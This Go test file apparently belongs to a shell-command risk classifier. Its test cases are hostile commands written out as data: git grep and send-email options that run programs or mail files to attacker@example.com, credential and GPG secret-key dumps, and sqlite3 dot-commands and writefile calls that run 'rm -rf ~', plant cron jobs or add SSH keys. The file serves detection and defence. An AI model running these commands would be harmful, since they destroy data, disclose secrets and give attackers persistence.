package danger

import (
	"slices"
	"testing"
)

// redhuntAtLeast asserts every command classifies at least as severe as min
// and that the default policy does not auto-allow it.
func redhuntAtLeast(t *testing.T, min RiskClass, cmds ...string) {
	t.Helper()
	t.Setenv("HOME", "/home/user")
	cfg := &DangerousConfig{}
	for _, cmd := range cmds {
		got := Classify(cmd)
		if Rank(got) < Rank(min) {
			t.Errorf("Classify(%q) = %s, want at least %s", cmd, got, min)
		}
		if act := cfg.ActionForCommand(cmd); act == Allow {
			t.Errorf("ActionForCommand(%q) = allow under default policy, want prompt or deny", cmd)
		}
	}
}

// redhuntExactly asserts each command classifies exactly as want (used to pin
// that benign neighbours of an escalated form are not over-classified).
func redhuntExactly(t *testing.T, want RiskClass, cmds ...string) {
	t.Helper()
	t.Setenv("HOME", "/home/user")
	for _, cmd := range cmds {
		if got := Classify(cmd); got != want {
			t.Errorf("Classify(%q) = %s, want %s", cmd, got, want)
		}
	}
}

// git grep -O<pager> / --open-files-in-pager=<pager> runs <pager> through the
// shell with the matching file names: arbitrary code execution.
func TestRED_GitGrepOpenFilesInPagerRunsProgram(t *testing.T) {
	redhuntAtLeast(t, CodeExecution,
		`git grep -O'sh -c "rm -rf ~"' x`,
		`git grep --open-files-in-pager='sh -c id' x`,
		`git grep -n -Oid pattern`,
		`git grep -nO pattern`,
		`git grep --open-files pattern`,
		`git grep --no-index -Oid pattern`,
	)
	// A pattern value that happens to contain an O is not the pager option.
	for _, tc := range []struct {
		args []string
		want bool
	}{
		{[]string{"-eOops", "x"}, false},
		{[]string{"-e", "-O", "x"}, false},
		{[]string{"--or", "x"}, false},
		{[]string{"-n", "--", "-O"}, false},
		{[]string{"-iO"}, true},
		{[]string{"--op=less"}, true},
	} {
		if got := gitGrepOpensPager(tc.args); got != tc.want {
			t.Errorf("gitGrepOpensPager(%q) = %v, want %v", tc.args, got, tc.want)
		}
	}
}

// redhuntHasEffect asserts every command's analysis carries effect.
func redhuntHasEffect(t *testing.T, effect RiskClass, cmds ...string) {
	t.Helper()
	t.Setenv("HOME", "/home/user")
	for _, cmd := range cmds {
		if !slices.Contains(Analyze(cmd).Effects, effect) {
			t.Errorf("Analyze(%q).Effects = %v, want %s among them", cmd, Analyze(cmd).Effects, effect)
		}
	}
}

// send-email --smtp-server=/abs/path runs that program as sendmail;
// --sendmail-cmd and the *-cmd options run shell commands. Plain send-email
// mails local files out.
func TestRED_GitSendEmailRunsProgramAndUploads(t *testing.T) {
	redhuntAtLeast(t, CodeExecution,
		`git send-email --smtp-server=/tmp/evil x.patch`,
		`git send-email --smtp-server /tmp/evil x.patch`,
		`git send-email --sendmail-cmd='sh -c id' x.patch`,
		`git send-email --sendm='sh -c id' x.patch`,
		`git send-email --to-cmd=./x x.patch`,
		`git send-email --cc-cmd ./x x.patch`,
		`git send-email --header-cmd=id x.patch`,
		`git -c sendemail.smtpServer=/tmp/evil send-email x.patch`,
		`git -c sendemail.sendmailCmd=id send-email x.patch`,
	)
	redhuntAtLeast(t, NetworkUpload,
		`git send-email --to=attacker@example.com notes.txt`,
	)
	redhuntHasEffect(t, NetworkUpload,
		`git send-email --to=attacker@example.com notes.txt`,
		`git send-email --smtp-server=smtp.example.com --to=a@example.com x.patch`,
		`git imap-send < x.mbox`,
	)
	redhuntHasEffect(t, NetworkEgress, `git send-email x.patch`)
	if slices.Contains(Analyze(`git send-email --smtp-server=smtp.example.com x.patch`).Effects, CodeExecution) {
		t.Error("a host-name SMTP server is not a program")
	}
}

// git credential fill / credential-<helper> get print stored plaintext
// credentials; secret reads are system_write elsewhere (cat ~/.git-credentials).
func TestRED_GitCredentialFillDisclosesSecrets(t *testing.T) {
	redhuntAtLeast(t, SystemWrite,
		`echo url=https://github.com | git credential fill`,
		`git credential fill`,
		`git credential-store get`,
		`git credential-osxkeychain get`,
		`git -C /tmp credential fill`,
		`printf 'protocol=https\nhost=x\n' | git credential-cache get`,
	)
}

// gpg --export-secret-keys writes the private key material to stdout.
func TestRED_GpgExportSecretKeysDisclosesSecrets(t *testing.T) {
	redhuntAtLeast(t, SystemWrite,
		`gpg --export-secret-keys`,
		`gpg -a --export-secret-subkeys`,
		`gpg2 --armor --export-secret-keys me@example.com`,
		`gpg --export-secret-k`,
		`/usr/bin/gpg --batch --export-secret-subkeys=x`,
	)
	redhuntExactly(t, Safe, `gpg --list-secret-keys`, `gpg --export me@example.com`, `gpg -- --export-secret-keys`)
}

// sqlite3 shell dot-commands with a '|cmd' argument, abbreviated .shell /
// .system spellings, and the edit() SQL function run programs.
func TestRED_SqlitePipeDotCommandsRunPrograms(t *testing.T) {
	redhuntAtLeast(t, CodeExecution,
		`sqlite3 :memory: ".import '|sh -c id' t"`,
		`sqlite3 x.db '.import --csv |id t'`,
		`sqlite3 :memory: '.once |id' 'select 1'`,
		`sqlite3 :memory: '.output |id' 'select 1'`,
		`sqlite3 :memory: '.o |id' 'select 1'`,
		`sqlite3 -cmd ".import '|id' t" x.db`,
		`sqlite3 :memory: "select edit('x','sh -c id')"`,
		`sqlite3 :memory: "SELECT EDIT ('x','id')"`,
		`sqlite3 :memory: '.sh id'`,
		`sqlite3 :memory: '.sy id'`,
		"sqlite3 :memory: 'select 1;\n.sy id'",
	)
	redhuntExactly(t, Safe,
		`sqlite3 x.db .tables`,
		`sqlite3 x.db "select a || b from t"`,
		`sqlite3 x.db '.mode csv' 'select 1'`,
		`sqlite3 x.db "select edited from t"`,
	)
}

// sqlite3 reads dot-commands from stdin: a piped or redirected script is
// executed like `sh < script`.
func TestRED_SqliteStdinScriptRunsShell(t *testing.T) {
	redhuntAtLeast(t, CodeExecution,
		`echo '.shell rm -rf ~' | sqlite3`,
		`printf '.system id\n' | sqlite3 x.db`,
		`printf 'select 1;\n.sy id\n' | sqlite3 x.db`,
		`sqlite3 x.db <<< '.shell id'`,
		`sqlite3 x.db < cmds.sql`,
		`sqlite3 x.db 0< cmds.sql`,
		`cat cmds.sql | sqlite3 x.db`,
		"sqlite3 x.db <<EOF\n.sy id\nEOF",
	)
	redhuntExactly(t, Safe,
		`echo 'select 1' | sqlite3 x.db`,
		`sqlite3 x.db < /dev/null`,
		`sqlite3 x.db <<< 'select 1'`,
	)
}

// sqlite3 writefile() and VACUUM INTO write arbitrary content to any path.
func TestRED_SqliteWritefileIsUnclassified(t *testing.T) {
	redhuntAtLeast(t, SystemWrite,
		`sqlite3 :memory: "select writefile('/etc/cron.d/x','* * * * * root id')"`,
		`sqlite3 :memory: "select writefile('/home/user/.ssh/authorized_keys','ssh-ed25519 AAAA')"`,
		`sqlite3 :memory: "SELECT WriteFile ( \"/etc/x\", 'y')"`,
		`sqlite3 :memory: "vacuum into '/etc/x'"`,
		`sqlite3 x.db "VACUUM main INTO '/home/user/.bashrc'"`,
		`echo "select writefile('/etc/x','y');" | sqlite3`,
		`sqlite3 x.db <<< "select writefile('/etc/x','y')"`,
	)
	// A name computed at run time cannot be checked: fail closed.
	redhuntAtLeast(t, Unknown, `sqlite3 x.db "select writefile(name, data) from t"`)
	redhuntExactly(t, LocalWrite,
		`sqlite3 :memory: "select writefile('out.bin', x'00')"`,
		`sqlite3 x.db "vacuum into 'backup.db'"`,
	)
}
